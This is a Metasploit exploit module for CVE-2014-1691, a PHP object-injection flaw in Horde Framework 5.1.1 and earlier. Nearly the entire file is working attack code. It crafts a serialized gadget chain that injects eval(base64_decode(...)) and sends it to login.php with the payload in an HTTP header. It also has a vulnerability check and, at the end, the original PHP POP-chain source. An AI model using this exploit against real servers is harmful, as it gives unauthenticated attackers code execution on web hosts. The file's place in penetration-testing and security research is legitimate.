# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Horde Framework Unserialize PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a php unserialize() vulnerability in Horde <= 5.1.1 which could be
        abused to allow unauthenticated users to execute arbitrary code with the permissions of
        the web server. The dangerous unserialize() exists in the &#039;lib/Horde/Variables.php&#039; file.
        The exploit abuses the __destruct() method from the Horde_Kolab_Server_Decorator_Clean
        class to reach a dangerous call_user_func() call in the Horde_Prefs class.
      },
      &#039;Author&#039;         =>
        [
          &#039;EgiX&#039;, # Exploitation technique and Vulnerability discovery (originally reported by the vendor)
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-1691&#039; ],
          [ &#039;URL&#039;, &#039;http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection&#039; ],
          [ &#039;URL&#039;, &#039;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=737149&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/horde/horde/commit/da6afc7e9f4e290f782eca9dbca794f772caccb3&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        => [ [&#039;Horde 5&#039;, { }], ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jun 27 2013&#039;
      ))

      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [ true, "The base path to Horde", "/horde/"])
        ], self.class)
  end

  def check
    flag = rand_text_alpha(rand(10)+20)
    res = send_request_exploit("print #{flag};die;")
    if res and res.body and res.body.to_s =~ /#{flag}/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Testing injection...")
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, "#{peer} - Target isn&#039;t vulnerable, exiting...")
    end

    print_status("#{peer} - Exploiting the unserialize()...")
    send_request_exploit(payload.encoded)
  end

  def send_request_exploit(p)
    php_injection = "eval(base64_decode($_SERVER[HTTP_CMD]));die();"

    payload_serialized = "O:34:\"Horde_Kolab_Server_Decorator_Clean\":2:{s:43:\"\x00Horde_Kolab_Server_Decorator_Clean\x00_server\";"
    payload_serialized << "a:2:{i:0;O:12:\"Horde_Config\":1:{s:13:\"\x00*\x00_oldConfig\";s:#{php_injection.length}:\"#{php_injection}\";}i:1;s:13:\"readXMLConfig\";}}"

    send_request_cgi(
      {
        &#039;uri&#039;       => normalize_uri(target_uri.path.to_s, "login.php"),
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039; => {
          &#039;_formvars&#039; => payload_serialized
        },
        &#039;headers&#039; => {
          &#039;Cmd&#039; => Rex::Text.encode_base64(p)
        }
      })
  end
end

=begin

PHP chain by EgiX: http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection

class Horde_Config
{
   protected $_oldConfig = "phpinfo();die;";
}

class Horde_Prefs_Scope
{
}

class Horde_Prefs
{
   protected $_opts, $_scopes;

   function __construct()
   {
      $this->_opts[&#039;sizecallback&#039;] = array(new Horde_Config, &#039;readXMLConfig&#039;);
      $this->_scopes[&#039;horde&#039;] = new Horde_Prefs_Scope;
   }
}

class Horde_Prefs_Identity
{

   function __construct()
   {
   }
}

class Horde_Kolab_Server_Decorator_Clean
{
   private $_server, $_added = array(1);

   function __construct()
   {
      $this->_server = new Horde_Prefs_Identity;
   }
}

$popchain = serialize(new Horde_Kolab_Server_Decorator_Clean);

=end

